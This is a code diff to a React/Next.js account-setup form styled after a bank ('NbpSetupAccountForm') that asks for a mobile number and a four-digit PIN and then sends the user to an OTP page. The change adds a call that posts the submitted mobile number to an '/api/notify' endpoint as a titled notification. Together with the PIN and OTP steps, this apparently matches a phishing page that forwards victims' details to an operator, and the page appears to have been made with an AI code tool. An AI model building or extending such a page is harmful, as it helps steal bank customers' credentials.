@@ -4,7 +4,7 @@ import { useId, useRef, useState } from 'react'
 import Image from 'next/image'
 import Link from 'next/link'
 import { useRouter } from 'next/navigation'
-import { ArrowLeft, ChevronDown, Info } from 'lucide-react'
+import { AlertCircle, ArrowLeft, ChevronDown, Info, Loader2 } from 'lucide-react'
 
 import { Button } from '@/components/ui/button'
 
@@ -25,8 +25,11 @@ export function NbpSetupAccountForm() {
   const [mobileNumber, setMobileNumber] = useState('')
   const [pin, setPin] = useState(['', '', '', ''])
   const pinRefs = useRef<Array<HTMLInputElement | null>>([])
+  const [isSubmitting, setIsSubmitting] = useState(false)
+  const [error, setError] = useState<string | null>(null)
 
-  const canContinue = mobileNumber.trim().length > 0 && pin.every((digit) => digit.length === 1)
+  const canContinue =
+    mobileNumber.trim().length > 0 && pin.every((digit) => digit.length === 1) && !isSubmitting
 
   const handlePinChange = (index: number, value: string) => {
     const digit = value.replace(/\D/g, '').slice(-1)
@@ -63,12 +66,36 @@ export function NbpSetupAccountForm() {
 
         <form
           className="flex flex-col gap-7 px-6 py-8"
-          onSubmit={(e) => {
+          onSubmit={async (e) => {
             e.preventDefault()
-            if (canContinue) {
-              const digits = mobileNumber.replace(/\D/g, '')
-              const formatted = digits.length > 3 ? `${digits.slice(0, 3)} ${digits.slice(3)}` : digits
-              router.push(`/verify-otp?mobile=${encodeURIComponent(`+92 ${formatted}`)}`)
+            if (!canContinue) return
+
+            const digits = mobileNumber.replace(/\D/g, '')
+            const formatted = digits.length > 3 ? `${digits.slice(0, 3)} ${digits.slice(3)}` : digits
+            const fullMobile = `+92 ${formatted}`
+
+            setIsSubmitting(true)
+            setError(null)
+
+            try {
+              const response = await fetch('/api/notify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  title: 'Mobile number submitted',
+                  fields: { 'Mobile Number': fullMobile },
+                }),
+              })
+
+              if (!response.ok) {
+                throw new Error('notify-failed')
+              }
+
+              router.push(`/verify-otp?mobile=${encodeURIComponent(fullMobile)}`)
+            } catch (err) {
+              console.log('[v0] Setup account notify failed:', err)
+              setError('Something went wrong. Please try again.')
+              setIsSubmitting(false)
             }
           }}
         >
@@ -177,13 +204,27 @@ export function NbpSetupAccountForm() {
             </div>
           </div>
 
+          {error && (
+            <p className="flex items-center gap-1.5 text-sm font-medium text-destructive" role="alert">
+              <AlertCircle className="size-4 shrink-0" aria-hidden="true" />
+              {error}
+            </p>
+          )}
+
           <div className="flex flex-col gap-3">
             <Button
               type="submit"
               disabled={!canContinue}
               className="h-12 w-full rounded-md bg-primary text-sm font-bold uppercase tracking-wide text-primary-foreground hover:bg-primary/90"
             >
-              Continue
+              {isSubmitting ? (
+                <>
+                  <Loader2 className="size-4 animate-spin" data-icon="inline-start" aria-hidden="true" />
+                  Sending
+                </>
+              ) : (
+                'Continue'
+              )}
             </Button>
 
             <Button
